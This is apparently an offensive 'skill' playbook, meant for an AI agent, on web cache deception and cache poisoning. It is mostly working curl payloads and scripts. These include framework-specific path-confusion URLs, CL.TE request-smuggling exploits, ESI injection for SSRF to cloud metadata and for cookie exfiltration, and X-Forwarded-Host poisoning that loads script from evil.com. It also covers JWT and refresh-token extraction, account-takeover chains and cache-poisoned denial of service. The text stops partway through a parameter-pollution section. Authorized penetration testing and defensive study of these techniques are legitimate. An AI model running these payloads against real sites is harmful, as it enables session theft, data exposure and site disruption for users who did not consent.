# NEVER use .json or .xml — Rails returns JSON/XML by design (FP-7)
```

**CVE-2025-61598 (Discourse):**
```bash
curl -sI -H "Cookie: _t=ACCOUNT_A" "https://DISCOURSE_TARGET/session/current;wcd.css"
```

### Django / Python

```bash
# APPEND_SLASH behavior check
curl -sI "https://TARGET/account" | head -5  # 301 → /account/ if APPEND_SLASH=True

# re_path() without $ anchor
/account/${WCD_ID}.css  # 200 if route is re_path(r'^account', view)

# Static/media traversal
/static/..%2faccount/
/media/..%2faccount/
```

### Express.js / Node.js

```bash
# Wildcard routes: app.get('/account/*', handler)
/account/${WCD_ID}.css

# Static middleware traversal
/static/..%2faccount

# Check for loose regex: app.get(/^\/account/, handler)
/account.css
```

### ASP.NET / IIS

```bash
# Backslash path confusion (universal IIS differential)
/account%5C${WCD_ID}.css
# IIS: \ treated as / → routes to /account
# CDN: sees /account%5Cxxx.css → caches based on extension

# X-Original-URL path override (Symfony, IIS URL Rewrite)
curl -sI -H "X-Original-URL: /api/user/profile" "https://TARGET/static/cacheable.css"
# Origin processes /api/user/profile; cache stores under /static/cacheable.css

# X-Rewrite-URL override
curl -sI -H "X-Rewrite-URL: /admin/users" "https://TARGET/images/banner.png"
```

### PHP

```bash
# PATH_INFO exploitation (AcceptPathInfo On)
/account.php/${WCD_ID}.css
# PHP: SCRIPT_NAME=/account.php, PATH_INFO=/xxx.css → serves account.php
# CDN: URL ends in .css → caches
```

### SvelteKit CVEs

```bash
# CVE-2025-67647 — missing Cache-Control on __data.json
curl -sI -H "Cookie: session=ACCOUNT_A" "https://TARGET/account/__data.json" | grep "cache-control"
# If absent → CDN may cache user-specific JSON

# CVE-2024-34049 — path traversal in static serving
curl -sI "https://TARGET/_app/immutable/..%2f..%2faccount"
```

---

## Phase 6: CDN Differential Matrix

### Full CDN × 11 Behaviors Matrix

| Behavior | Cloudflare | Akamai | Fastly | CloudFront | Azure CDN | GCP CDN | Nginx proxy_cache | Varnish |
|----------|-----------|--------|--------|------------|-----------|---------|------------------|---------|
| Normalizes dot-segments before cache rules | No | No | No | **Yes** | **Yes** | No | No | No |
| Decodes `%2F` before rules | No | No | No | **Yes** | **Yes** | No | No | No |
| Recognizes `;` as delimiter | No | No | No | No | No | No | No | No |
| Recognizes `.` as format delimiter | No | No | No | No | No | No | No | No |
| Converts `%5C` to `/` | No | No | No | No | No | No | No | No |
| Query string in cache key (default) | Yes | Config | Yes | **No** | Config | Yes | Yes | Yes |
| Cookie in cache key | No | Config | No | No | No | No | No | No |
| Cache Deception protection | CDA (off by default) | CT validation (config) | None | None | None | None | None | None |

### High-Confidence CDN + Framework Combinations

| CDN | Origin | Delimiter | Payload | Confidence |
|-----|--------|-----------|---------|------------|
| Cloudflare | Spring/Tomcat | `;` | `/account;wcd.css` | High |
| Cloudflare | Spring/Tomcat | `%3B` | `/account%3Bwcd.css` | High |
| Cloudflare | Rails | `.` | `/account.ico` | High |
| Cloudflare | OpenLiteSpeed | `%00` | `/account%00wcd.css` | High |
| Cloudflare | Nginx (rewrite) | `%0A` | `/users/account%0awcd.css` | Medium |
| Cloudflare | Any normalizing | `..%2f` | `/static/..%2faccount` | High |
| Akamai | Spring/Tomcat | `;` | `/account;wcd.js` | High |
| CloudFront | Spring + traversal | `;+%2f` | `/account;%2f%2e%2e%2fstatic/x` | High |
| Any CDN | IIS | `%5C` | `/static/..%5Caccount` | High |

---

## Phase 7: Two-Session Verification Protocol

**Never report a WCD finding without completing this protocol.**

### Step 1: Establish Canonical Baseline Controls

```bash
CANARY="WCD-CANARY-$(openssl rand -hex 8)"
# MANUALLY: Set Account A's display name or bio to this canary value

# Verify canary appears with authentication
curl -s -H "Cookie: session=ACCOUNT_A_SESSION" "https://TARGET/ENDPOINT" | grep -c "$CANARY"
# Must find canary > 0

# Verify canary ABSENT without authentication
curl -s "https://TARGET/ENDPOINT" | grep -c "$CANARY"
# Must be 0 (redirected or 401/403)

# HARD STOP: If anonymous users see Account A's data at the CANONICAL URL, this is IDOR, NOT WCD.
```

### Step 2: Prime as Account A

```bash
WCD_ID=$(openssl rand -hex 4)
DECEPTION_URL="https://TARGET/ENDPOINT;wcd-${WCD_ID}.css"

curl -sS -D /tmp/wcd-prime-headers.txt \
  -H "Cookie: session=ACCOUNT_A_SESSION" \
  "$DECEPTION_URL" -o /tmp/wcd-prime-body.html

echo "Cache status: $(grep -iE 'x-cache|cf-cache' /tmp/wcd-prime-headers.txt)"
echo "Canary present: $(grep -c "$CANARY" /tmp/wcd-prime-body.html)"
# Expected: 200 OK, canary present, X-Cache: MISS

sleep 3
# Confirm cache storage (re-request with same session)
curl -sI -H "Cookie: session=ACCOUNT_A_SESSION" "$DECEPTION_URL" | grep -iE "x-cache|cf-cache|age"
# Expected: HIT or Age > 0
```

### Step 3: Probe Without Account A Credentials

```bash
# Verify probe session is completely isolated first
curl -sI "https://TARGET/ENDPOINT" | head -1
# Must be 401/403/302 (not 200)

curl -sS -D /tmp/wcd-probe-headers.txt "$DECEPTION_URL" -o /tmp/wcd-probe-body.html

echo "CANARY PRESENT: $(grep -c "$CANARY" /tmp/wcd-probe-body.html)"
echo "X-Cache: $(grep -iE 'x-cache|cf-cache' /tmp/wcd-probe-headers.txt)"
```

**If canary present + X-Cache HIT + body hash matches prime → WCD CONFIRMED (preliminary)**
**If canary present + X-Cache MISS → NOT WCD, this is IDOR/broken access control**

### Step 4: Negative Controls (ALL 5 Must Pass)

```bash
# 4.1: Unprimed URL — canary must be ABSENT
CTRL_ID=$(openssl rand -hex 4)
curl -s "https://TARGET/ENDPOINT;wcd-${CTRL_ID}.css" | grep -c "$CANARY"
# Must be 0 — if canary appears, this is broken access control, NOT WCD

# 4.2: Canonical URL still enforces auth
curl -s "https://TARGET/ENDPOINT" | grep -c "$CANARY"
# Must be 0

# 4.3: Account B sees no cross-contamination
curl -s -H "Cookie: session=ACCOUNT_B_SESSION" "https://TARGET/ENDPOINT" | grep -c "$CANARY"
# Must be 0

# 4.4: Non-cacheable variant does not leak
BUST_ID=$(openssl rand -hex 4)
curl -s -H "Cookie: session=ACCOUNT_A_SESSION" "https://TARGET/ENDPOINT?nocache=${BUST_ID}" -o /dev/null
curl -s "https://TARGET/ENDPOINT?nocache=${BUST_ID}" | grep -c "$CANARY"
# Must be 0 — isolates caching as the mechanism

# 4.5: Document edge node (scope verification)
curl -sS -D- "$DECEPTION_URL" | grep -iE "x-served-by|cf-ray|x-amz-cf-pop"
```

### Step 5: Second Independent Reproduction

Set a NEW canary value on Account A, generate a new WCD_ID, repeat Steps 2-4 fully.

**Minimum threshold:** 2 independent reproductions, each with unique canary and WCD_ID, all 5 negative controls passing.

### Step 6: Cleanup

```bash
# Cloudflare purge
curl -sS -X POST "https://api.cloudflare.com/client/v4/zones/ZONE_ID/purge_cache" \
  -H "Authorization: Bearer API_TOKEN" -H "Content-Type: application/json" \
  --data "{\"files\":[\"$DECEPTION_URL\"]}"

# CloudFront invalidation
aws cloudfront create-invalidation --distribution-id DIST_ID --paths "/ENDPOINT;wcd-*"

# Fastly purge
curl -sS -X POST "https://api.fastly.com/purge/$DECEPTION_URL" -H "Fastly-Key: API_KEY"

# Default TTLs when origin sets no Cache-Control:
# Cloudflare: depends on rules (2h-4h for Cache Everything)
# CloudFront: 24 hours
# Akamai: 1h-7d (property-dependent)
# Fastly: 3600s
# Varnish: 120s
```

---

## Phase 8: False Positive Elimination

Execute these in order. Stop at the first YES.

| FP | Description | Test | Fix |
|----|-------------|------|-----|
| FP-1 | Account A cookies still in probe | `curl -v "$DECEPTION_URL" 2>&1 \| grep -i "^> Cookie"` — must be empty | Use completely separate client/session |
| FP-2 | Browser/service worker cache | Check if `Size` column shows `(from disk cache)` | Use curl, different machine |
| FP-3 | Response contains no identity-specific data | `diff auth-response.html noauth-response.html` | Only report if data is user-specific AND private |
| FP-4 | Cache varies on Cookie/Authorization | Different session → `curl -sI -H "Cookie: session=DIFFERENT_VALUE" "$DECEPTION_URL" \| grep "x-cache"` — MISS means per-user keying | True negative |
| FP-5 | Error page cached (not sensitive data) | Check prime response status — must be 200 | Adjust payload |
| FP-6 | 301/302 redirect cached | `head -1 /tmp/prime-headers.txt` | Redirect, not data |
| FP-7 | Extension triggers content negotiation | Compare Content-Type of canonical vs suffixed URL | Use `.ico`, `.avif`, `.map` instead of `.json` |
| FP-8 | Canary data is publicly visible | `curl -s "https://TARGET/ENDPOINT" \| grep -c "$CANARY"` without auth | Use private fields: email, API key, internal ID |
| FP-9 | Cache key includes unguessable query | Test two different query values, both MISS | Downgrade to informational |
| FP-10 | Cache hit is per-PoP only | Compare `cf-ray`/`x-amz-cf-pop` between prime and probe | Still valid, note scope |
| FP-11 | Stale data from same user | Verify current canary (set THIS test) appears in probe | Use new canary each test |
| FP-12 | Personalization is region-based | Check `Vary: Accept-Language` or geolocation header | Confirm data is identity-specific |

---

## Phase 9: Bypass Decision Trees

### Tree 1: Extension Suffix Not Being Cached

1. Check `Cache-Control` on prime response — `no-store`/`private` present?
2. Test if CDN ignores `Cache-Control: no-store` (try with known static URL)
3. Check for CDA active (`CF-Cache-Status: BYPASS` on content-type mismatch)
4. Try CDA bypass extensions: `.avif`, `.woff2`, `.map`, `.ico`, `.webmanifest`
5. Try encoded delimiters: `%3B` instead of `;`, `%23`, `%3F`
6. Fall back to directory-based attacks (Tree 3) — CDA does NOT protect directory rules

**Extension fallback order when `.css` fails:**
`.ico` → `.avif` → `.woff2` → `.map` → `.webmanifest` → `.exe` → `.bin` → `.svg`

### Tree 2: Origin Rejects the Crafted URL (404/400)

- 404 → test if origin accepts extra path segments: `/account/anything` → 200 means path-append (1B) works
- 400 → avoid `%00`, `%0A` (control characters), use `;` or `%23`
- 301/302 → check if redirect itself is cached with sensitive location; follow to see final response

**Framework delimiter selection:**

| Framework | Primary | Secondary | Tertiary |
|-----------|---------|-----------|----------|
| Spring/Tomcat | `;` | `;jsessionid=x` | `%3B` |
| Rails | `.` | `.ico`, `.avif` | `%2E` |
| ASP.NET/IIS | `;` | `%5C` | `%00` (< Win 2008) |
| PHP | PATH_INFO `/` | `%00` (< 5.3.4) | — |
| Express.js | `.` | `/` (wildcards) | — |
| Django | `/` (re_path) | `.` | — |

### Tree 3: Directory Prefix Not Cached

```bash
# Discover all cached prefixes
for prefix in static assets public media images css js fonts uploads wp-content \
  wp-includes _next/static build dist bundles resources _app/immutable; do
  CACHE=$(curl -sI "https://TARGET/${prefix}/test.css" | grep -iE "cf-cache|x-cache" | head -1)
  echo "$CACHE" | grep -qi "hit\|miss" && echo "[CACHEABLE] /${prefix}/"
done
```

If nothing cached → WCD via path confusion is not feasible. Document negative finding.

---

## Phase 10: Advanced Attack Chains

### HTTP Request Smuggling + WCD

Standard WCD requires the victim to visit the crafted URL. Smuggling eliminates this requirement.

**CL.TE Detection:**
```bash
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nGPOST' | \
  openssl s_client -connect TARGET:443 -quiet 2>/dev/null
# GPOST/XGET/XPOST method in next response → desync confirmed
```

**CL.TE WCD Exploit:**
```bash
{
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 130\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nGET /api/auth/session HTTP/1.1\r\nHost: TARGET\r\nCookie: session=ACCOUNT_A_SESSION\r\nContent-Length: 15\r\n\r\nx=1'
sleep 0.05
printf 'GET /static/app.js HTTP/1.1\r\nHost: TARGET\r\nConnection: close\r\n\r\n'
} | openssl s_client -connect TARGET:443 -quiet 2>/dev/null
# Session data stored under /static/app.js cache key
curl -s "https://TARGET/static/app.js"  # retrieve from cache
```

**H2.CL Detection:**
```bash
curl -s -o /dev/null -w "%{http_version}" --http2 "https://TARGET/"
# "2" = HTTP/2 accepted; check Via header for H1 downgrade to origin
```

**Tools:** HTTP Request Smuggler (Burp Extension), Turbo Intruder, h2csmuggler, Python `h2` library

### Cache Poisoning Escalation Chains

**X-Original-URL / X-Rewrite-URL path override (direct WCD):**
```bash
# Origin processes the override path; cache keys on the actual URL
curl -s -H "X-Original-URL: /api/user/profile" \
  -H "Cookie: session=ACCOUNT_A_SESSION" \
  "https://TARGET/static/cacheable-page.css"
# Verify from clean session:
curl -s "https://TARGET/static/cacheable-page.css"  # returns profile data
```

**X-Forwarded-Host → Script Import Hijack (Stored XSS):**
```bash
# Check if unkeyed X-Forwarded-Host controls script imports
curl -s -H "X-Forwarded-Host: evil.com" "https://TARGET/" | grep 'src=".*evil.com'
# If reflected: poison the cache without cachebuster
curl -s -H "X-Forwarded-Host: evil.com" "https://TARGET/" -o /dev/null -D -
# Verify: clean session loads attacker's JS
```

**Fat GET detection:**
```bash
curl -s -X GET -d "param=test_value" "https://TARGET/api/endpoint"
# Different response → body influences response
# Cache ignores body → poisoned under URL only
```

**Parameter cloaking (Rails Rack):**
```bash
# CDN strips utm_content from cache key but passes full value
# Rails parses ; as parameter separator
curl -s "https://TARGET/page?utm_content=x;callback=evil_function"
# Cached under /page; response contains evil_function(...)
```

### ESI Injection

**ESI-capable systems:** Akamai, Fastly, Varnish, Squid

```bash
# Detect ESI processing
curl -s "https://TARGET/search?q=%3Cesi:debug+/%3E" | head -20
curl -s "https://TARGET/search?q=%3Cesi:include+src=%27/robots.txt%27+/%3E" | grep -i "disallow"

# SSRF via ESI (AWS metadata)
# q=<esi:include src='http://169.254.169.254/latest/meta-data/iam/security-credentials/'/>

# Cookie exfiltration bypassing HttpOnly
# input=<esi:vars>$(HTTP_COOKIE{session_id})</esi:vars>
# ESI is server-side — HttpOnly only prevents JavaScript access, not ESI

# ESI + WCD chain
# 1. Inject ESI into cacheable page: <esi:include src='/api/user/me'/>
# 2. If ESI fragment caches: first user's data served to all
curl -s -H "Cookie: session=ACCOUNT_A" \
  "https://TARGET/product/123?review=%3Cesi:include+src=%27/api/user/me%27+/%3E" \
  -o /tmp/esi-prime.html
sleep 2
curl -s -H "Cookie: session=ACCOUNT_B" \
  "https://TARGET/product/123?review=%3Cesi:include+src=%27/api/user/me%27+/%3E" \
  -o /tmp/esi-probe.html
diff /tmp/esi-prime.html /tmp/esi-probe.html  # Identical → cross-user WCD
```

### Cache-Poisoned Denial of Service (CPDoS)

**Three variants:**
1. **HHO (Header Oversize):** CDN accepts larger headers than origin → origin returns 400 → cached
2. **HMC (HTTP Meta Characters):** Control chars in headers trigger origin rejection → cached error
3. **HMO (HTTP Method Override):** `X-HTTP-Method-Override: DELETE` on GET → CDN caches GET, origin returns error

**Testing (requires explicit authorization; never on homepage/critical paths):**
```bash
CB="hho-$(openssl rand -hex 6)"
PADDING=$(python3 -c "print('A' * 10000)")
curl -s -D /tmp/hho-headers -H "X-Oversized-Header: $PADDING" \
  "https://TARGET/low-traffic-page?cb=${CB}" -o /tmp/hho-body.html
# If status 400 and cache shows HIT on clean re-request → HHO confirmed
sleep 2
curl -sI "https://TARGET/low-traffic-page?cb=${CB}" | grep -i "cf-cache"
```

**HMC Control Characters:**
- Null byte: `0x00`
- Line feed: `0x0A`
- Carriage return: `0x0D`
- Bell: `0x07`
- Escape: `0x1B`

**CPDoS exposure (CCS 2019):** 30% of Alexa Top 500 vulnerable; all 5 tested CDN providers were affected.

**CPDoS + WCD combo:** Use CPDoS to force a cache MISS on a page (via short-TTL error), then immediately race to prime with WCD payload. Converts "WCD works only on uncached URLs" to "WCD works on any URL."

### XS-Leaks via Cache Timing

**Server-side hidden cache detection:**
```bash
# Collect 20 uncached (unique CB) times and 20 paired (same CB) times
# Ratio cached_mean / baseline_mean < 0.7 → hidden cache detected
```

**Browser-side Performance API timing:**
```javascript
async function probeCacheByTiming(url, threshold = 50) {
    const times = [];
    for (let i = 0; i < 5; i++) {
        const start = performance.now();
        try {
            await fetch(url, { mode: 'no-cors', cache: 'force-cache', credentials: 'omit' });
        } catch(e) {}
        times.push(performance.now() - start);
    }
    times.sort((a, b) => a - b);
    return { url, cached: times[Math.floor(times.length / 2)] < threshold };
}
```

**Error-event probing (more reliable):**
```javascript
function probeWithImage(url, timeout = 2000) {
    return new Promise((resolve) => {
        const img = new Image();
        const start = performance.now();
        const cleanup = () => { img.onload = null; img.onerror = null; img.src = ''; };
        const timer = setTimeout(() => { cleanup(); resolve({ cached: false }); }, timeout);
        img.onload = img.onerror = () => {
            clearTimeout(timer);
            const elapsed = performance.now() - start;
            cleanup();
            resolve({ cached: elapsed < 30, time: elapsed });
        };
        img.src = url;
    });
}
```

**Mann-Whitney U statistical validation:** Use `scipy.stats.mannwhitneyu` to compare cached vs uncached timing distributions; p < 0.05 confirms timing differential is not noise.

**WCD + XS-Leak chain:** Craft WCD URL → victim visits while authenticated → CDN caches private data → attacker probes WCD URL via XS-Leak timing to detect cache entry → attacker fetches cached response server-side.

---

## Phase 11: OAuth/JWT Token Exploitation

### Token Extraction from Cached Response

```bash
WCD_ID=$(openssl rand -hex 4)
curl -s -D /tmp/jwt-prime-headers -b "session=ACCOUNT_A_SESSION_COOKIE" \
  "https://TARGET/api/auth/session;wcd-${WCD_ID}.css" -o /tmp/jwt-prime-body.json
sleep 3
curl -s "https://TARGET/api/auth/session;wcd-${WCD_ID}.css" -o /tmp/jwt-probe-body.json

# Extract JWT from response
JWT=$(cat /tmp/jwt-probe-body.json | python3 -c "
import json, sys
data = json.load(sys.stdin)
for path in ['accessToken', 'access_token', 'token', 'jwt', 'id_token',
             'session.accessToken', 'data.token', 'pageProps.session.accessToken']:
    obj = data
    try:
        for key in path.split('.'): obj = obj[key]
        if isinstance(obj, str) and '.' in obj: print(obj); break
    except: continue
")
```

### High-Value Endpoints for Token Extraction

| Endpoint | Framework | Token Type |
|----------|-----------|------------|
| `/api/auth/session` | Next.js (NextAuth) | accessToken JWT + session |
| `/api/me`, `/api/user` | Generic REST | Bearer token |
| `/_next/data/<buildId>/...json` | Next.js | pageProps.session.accessToken |
| `/__data.json` | SvelteKit | User data + tokens |
| `/_payload.json` | Nuxt | User data |
| `/graphql?query={me{...}}` | GraphQL | User data |

### JWT Claims to Check for Severity Escalation

```bash
# Decode JWT
JWT_PAYLOAD=$(echo "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool)

# Check for admin role
echo "$JWT_PAYLOAD" | grep -i '"admin"\|"superuser"\|"owner"'

# Check expiration window
EXP=$(echo "$JWT_PAYLOAD" | python3 -c "import json,sys; print(json.load(sys.stdin).get('exp',0))")
echo "Remaining seconds: $(( EXP - $(date +%s) ))"

# Check for token binding (freely replayable if cnf absent)
echo "$JWT_PAYLOAD" | python3 -c "import json,sys; d=json.load(sys.stdin); print('BOUND' if 'cnf' in d else 'FREELY_REPLAYABLE')"
```

**Critical JWT claims:**

| Claim | Key | Impact if Extracted |
|-------|-----|-------------------|
| Subject/User ID | `sub` | Identify target |
| Email | `email` | PII + account enumeration |
| Roles | `roles`, `scope`, `permissions` | Privilege escalation if admin |
| Expiration | `exp` | Viability window |
| DPoP binding | `cnf` | If absent: freely replayable |
| Authorization context | `iss`, `aud` | Token scope |

### Refresh Token Impact

A cached refresh token is **Critical severity regardless of access token TTL**:
- Lifetime: 30-90 days or indefinite
- Self-renewing: single extraction → unlimited new access tokens
- `stale-while-revalidate` extends the exploitation window further

### CSRF Token → Account Takeover Chain

```
1. WCD → cache /settings page containing CSRF token
2. Extract CSRF token from cached response
3. Craft form submission to email-change endpoint with stolen CSRF
4. Victim visits attacker page → browser sends with victim's session cookie
5. Email change → password reset → full account takeover

Requirements: SameSite=None or Lax; email change doesn't require password re-entry;
              no verification on old email address
```

---

## Phase 12: Edge Compute and Lambda@Edge

### Cloudflare Workers `caches.default`

Workers using `caches.default` cache ALL responses including authenticated ones under URL-only keys (no cookie in cache key).

```bash
curl -s -H "Cookie: session=ACCOUNT_A_SESSION" "https://TARGET/api/profile" \
  -D /tmp/worker-prime-headers.txt -o /tmp/worker-prime.json
grep -iE "cf-cache-status|age" /tmp/worker-prime-headers.txt
sleep 1
curl -s "https://TARGET/api/profile" -o /tmp/worker-probe.json
diff /tmp/worker-prime.json /tmp/worker-probe.json
# Identical → Worker cached authenticated response
```

### Lambda@Edge URI Rewriting

Lambda@Edge viewer-request functions rewrite URIs AFTER CloudFront computes the cache key.

```
CloudFront cache key: /api/user/profile.css (original URI with extension)
Origin receives: /api/user/profile (rewritten — Lambda stripped extension)
Result: Authenticated profile data cached under /api/user/profile.css
```

```bash
curl -s -H "Authorization: Bearer ACCOUNT_A_TOKEN" \
  "https://TARGET/api/user/profile.css" -o /tmp/lambda-prime.json
curl -s "https://TARGET/api/user/profile.css" -o /tmp/lambda-probe.json
diff /tmp/lambda-prime.json /tmp/lambda-probe.json
```

### Next.js ISR on Vercel

ISR pages are rendered on-demand and cached at the edge. First user's data is served to all users for the `revalidate` period.

```bash
# Check for ISR
curl -sI -H "Cookie: session=ACCOUNT_A_SESSION" "https://TARGET/dashboard" | \
  grep -iE "x-vercel-cache|cache-control.*s-maxage"
# x-vercel-cache: HIT or STALE = ISR caching active
```

---

## Phase 13: Sensitive Endpoint Discovery

### Priority Scoring

| Factor | Points |
|--------|--------|
| Contains auth tokens (CSRF, session, JWT) | +5 |
| Contains admin data | +5 |
| Contains financial data | +4 |
| Contains PII (email, name, phone) | +3 |
| Cache-Control is missing or `public` | +3 |
| Response is HTML with `__NEXT_DATA__` | +2 |
| Response is JSON (API endpoint) | +1 |
| Cache-Control is `no-store, private` | -2 |
| `Vary: Cookie` present | -1 |

**Tier 1 (Score 6+):** `/api/auth/session`, `/api/me`, `/graphql`, `/_next/data/<buildId>/account.json`

**Tier 2 (Score 3-5):** `/account`, `/dashboard`, `/settings`, `/api/user/profile`

### Common Sensitive URL Patterns

```
/api/user    /api/me       /api/v1/user    /api/v2/users/me
/api/auth/session          /oauth/userinfo
/_next/data/<buildId>/account.json
/account/__data.json       /settings/_payload.json
/billing     /api/invoices /api/payment-methods
/admin/dashboard           /api/admin/users
/messages    /notifications /api/conversations
/rails/active_storage/blobs/proxy/<signed_id>/filename
```

---

## Phase 14: Impact Assessment and CVSS

### Data Classification by Severity

| Data Type | Examples | CVSS Baseline |
|-----------|---------|---------------|
| OAuth refresh tokens | Long-lived token exchange | Critical (C:H/I:H) |
| Session tokens with ATO | JWT, session cookie with replay | High to Critical |
| Session tokens (no replay) | JWT, session, CSRF | High |
| Financial data | Credit card, billing, invoices | High |
| API keys | Service keys, webhook secrets | High |
| PII | Email, phone, name, address | Medium |
| CSRF tokens only | Anti-CSRF form tokens | Medium |
| Internal identifiers | User IDs, tenant IDs | Low |

### Common CVSS 3.1 Scores for WCD

```
PII only (no tokens):             AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N = 4.7
CSRF + demonstrated chain:        AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N = 6.1
Session token (replay proven):    AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N = 7.4
Session token + ATO:              AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N = 9.3
OAuth tokens (replay proven):     AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N = 9.3
Admin credentials / cross-tenant: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H = 9.6
```

**CWE references:** CWE-525 (Use of Web Browser Cache Containing Sensitive Information), CWE-524

### Bug Bounty Tier Reference

| Scenario | CVSS | Typical Bounty |
|----------|------|----------------|
| Cached page with CSRF token only | 3.1-4.0 | Low ($50-$200) |
| Cached PII (email, name, phone) | 4.0-5.5 | Medium ($200-$1,000) |
| CSRF + demonstrated state change | 5.5-7.0 | Medium-High ($500-$2,000) |
| Session token with replay | 7.0-8.5 | High ($2,000-$10,000) |
| OAuth tokens with replay | 7.5-9.0 | High-Critical ($5,000-$25,000) |
| Admin creds or cross-tenant | 9.0-10.0 | Critical ($10,000-$50,000+) |

---

## Phase 15: Real-World Findings Reference

### Known Bug Bounty Findings

- **HackerOne #1391635:** Cloudflare CDA bypass via `.avif` extension
- **CVE-2025-29927:** Next.js middleware bypass via `x-middleware-subrequest` header — authenticated cached responses exposed
- **CVE-2024-46982:** Next.js Stale Elixir — `x-now-route-matches` triggers `s-maxage=31536000` caching on user data
- **CVE-2024-34351:** Next.js SSRF via Host header on Server Actions
- **CVE-2025-61598:** Discourse (Rails) — semicolon + Cloudflare extension caching exposing CSRF tokens
- **CCS 2019 Research (CPDoS):** 30% of Alexa Top 500 vulnerable to CPDoS; all 5 tested CDN providers were affected

### Common Real-World Patterns

1. `/_next/data/<buildId>/account.json` cached under `/_next/` prefix → full user object in pageProps exposed
2. `/api/auth/session;wcd.css` on Spring Boot behind Cloudflare → JWT access token + refresh token exposed
3. `/static/..%2faccount` on Nginx behind Akamai → session page with CSRF token cached
4. Next.js ISR on Vercel: `x-vercel-cache: HIT` on user dashboard — first user's data served for `revalidate` period to all users
5. ESI injection on Varnish: reflected input containing `<esi:include src='/api/user/me'/>` in product page → `$(HTTP_COOKIE{session_id})` exfiltrated

---

## Quick-Reference: Testing Checklist

### Stage 1: Reconnaissance
- [ ] Identify CDN (signature headers)
- [ ] Determine normalization camp (non-normalizing vs normalizing)
- [ ] Detect framework (Spring/Rails/Next.js/Django/Express/PHP/IIS)
- [ ] Check for Cache Deception Armor (Cloudflare)

### Stage 2: Cache Mapping
- [ ] Discover which extensions are cached
- [ ] Discover which directory prefixes are cached
- [ ] Determine if query strings are in cache key
- [ ] Check if origin `Cache-Control: no-store` is honored

### Stage 3: Differential Discovery
- [ ] Test all 8 delimiter types
- [ ] Test path normalization (Direction 1 and 2)
- [ ] Framework-specific: semicolons (Spring), dot format (Rails), catch-all (Next.js)

### Stage 4: Payload Construction
- [ ] Family 1A: delimiter + extension
- [ ] Family 1B: path append (catch-all routes)
- [ ] Family 3A: directory traversal (non-normalizing CDN)
- [ ] Family 4A: compound delimiter+traversal (normalizing CDN)
- [ ] Framework data routes: `/_next/data/`, `/__data.json`, `/_payload.json`
- [ ] Family 8A: GraphQL GET caching (if CDN excludes query)

### Stage 5: Verification
- [ ] Two-session protocol (all 6 steps)
- [ ] 5 negative controls
- [ ] 2 independent reproductions with different canary values

### Stage 6: Advanced (if applicable)
- [ ] HTTP smuggling (CL.TE, TE.CL, H2.CL, H2.TE)
- [ ] Unkeyed headers (X-Forwarded-Host, X-Original-URL)
- [ ] ESI injection (Varnish, Akamai, Fastly, Squid)
- [ ] Edge compute (Cloudflare Workers, Lambda@Edge, Vercel ISR)
- [ ] CPDoS (only with explicit written authorization)

### Stage 7: Post-Exploitation
- [ ] Extract and decode any JWT tokens
- [ ] Check for refresh tokens (Critical regardless of access token TTL)
- [ ] Test token replay (only if authorized)
- [ ] Assess CSRF → ATO chain viability

### Stage 8: Cleanup (Mandatory)
- [ ] Purge all test cache entries via CDN API or wait for TTL
- [ ] Verify canary no longer appears in cached responses
- [ ] Restore Account A profile to pre-test state


---

## From hack-skills: Web Cache Deception & Cache Poisoning

### Cache Deception Attack Flow

**Goal**: Trick cache into storing authenticated user's response, then retrieve it unauthenticated.

```
1. Attacker sends victim a crafted URL:
   https://target.com/account/profile/nonexistent.css
   
2. Victim visits URL while authenticated:
   - App: ignores .css suffix, serves /account/profile (authenticated response)
   - CDN: sees .css extension → caches the response
   
3. Attacker visits same URL unauthenticated:
   - CDN: returns cached response (victim's authenticated data!)
```

**Verification**: Check `X-Cache: HIT` on unauthenticated follow-up request.

### Path Confusion Techniques

```
# Static extension append:
/account/profile/x.css
/account/profile/x.js
/account/profile/x.png

# Semicolon delimiter confusion:
/account/profile;.css     → app sees /account/profile, CDN sees .css extension

# URL-encoded slash:
/account/profile%2F.css   → different normalization by app vs CDN

# Query string with extension:
/account/profile?cb=x.css
```

### Finding Unkeyed Cache Inputs

Headers NOT in cache key (CDN ignores them, server reflects them):
```
X-Forwarded-Host: injected.attacker.com   → Host header poisoning
X-Forwarded-Scheme: http                   → Force HTTP redirect
X-Original-URL: /admin                     → Path override (Nginx/Drupal)
X-Rewrite-URL: /admin                      → Path override (IIS)
```

### Cache Poisoning via X-Forwarded-Host

```
1. Send request with:
   GET / HTTP/1.1
   Host: target.com
   X-Forwarded-Host: attacker.com

2. If response reflects "attacker.com" in URLs or scripts
   → CDN caches the page with attacker domain

3. All subsequent users receiving cached response load scripts from attacker.com
   → Stored XSS for all visitors
```

### Path Normalization Differential (CDN vs App)

| Payload | CDN Sees | App Sees |
|---|---|---|
| `/profile/..%2F..%2Fadmin` | `/profile/../../admin` | `/admin` |
| `/profile;.css` | `/profile` (w/ `.css`) | `/profile;.css` |
| `/profile/.css` | static (`.css`) | `/profile/.css` |
| `/api/users%0A.js` | static (`.js`) | `/api/users` (after decode) |



---

## http-parameter-pollution

# SKILL: HTTP Parameter Pollution (HPP) — Expert Playbook

> **AI LOAD INSTRUCTION**: HPP occurs when the same parameter appears multiple times in an HTTP request and the backend/WAF/proxy handle duplicates differently. Covers server-behavior matrix for all major frameworks, WAF bypass, SSRF split, CSRF confusion, and payment logic abuse. Base models often miss the per-framework behavior differences and the WAF bypass use case entirely.

## 0. RELATED ROUTING

- nosql-injection — HPP bracket notation can deliver NoSQL operators ($ne, $gt) in some frameworks
- ssrf-hunter — HPP can split URLs to bypass SSRF filters
- csrf-cross-site-request-forgery — HPP can confuse CSRF token validators

---

## 1. FRAMEWORK BEHAVIOR MATRIX

When `?param=value1&param=value2` is sent:

| Framework / Server | Parameter Handling | Example |
|---|---|---|
| **PHP** | Last value wins | `$_GET['param'] == "value2"` |
| **PHP (via $_POST)** | Last value wins | `$_POST['param'] == "value2"` |
